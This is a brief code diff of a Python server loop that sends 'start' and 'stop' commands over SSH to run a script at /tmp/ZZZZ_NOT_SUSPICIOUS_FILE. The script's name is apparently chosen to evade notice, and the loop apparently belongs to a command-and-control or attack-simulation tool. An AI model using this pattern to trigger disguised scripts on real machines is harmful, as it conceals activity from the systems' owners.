@@ -324,15 +324,15 @@ def serverForever(commandArgs):
             if RXmessage == "start":
                 # command chain
                 logger.info(
-                    "Sending command: python3 ZZZZ_NOT_SUSPICIOUS_FILE start")
-                sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE start")
+                    "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
+                sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE start")
                 RXmessage = sshChannel.recv(1024).decode()
                 logger.info(f"Received SSH message: {RXmessage}")
             elif RXmessage == "stop":
-                time.sleep(20)
+                time.sleep(28)
                 logger.info(
-                    "Sending command: python3 ZZZZ_NOT_SUSPICIOUS_FILE stop")
-                sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE stop")
+                    "Sending command: python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
+                sshChannel.send("python3 /tmp/ZZZZ_NOT_SUSPICIOUS_FILE stop")
                 RXmessage = sshChannel.recv(1024).decode()
                 logger.info(f"Received SSH message: {RXmessage}")
 
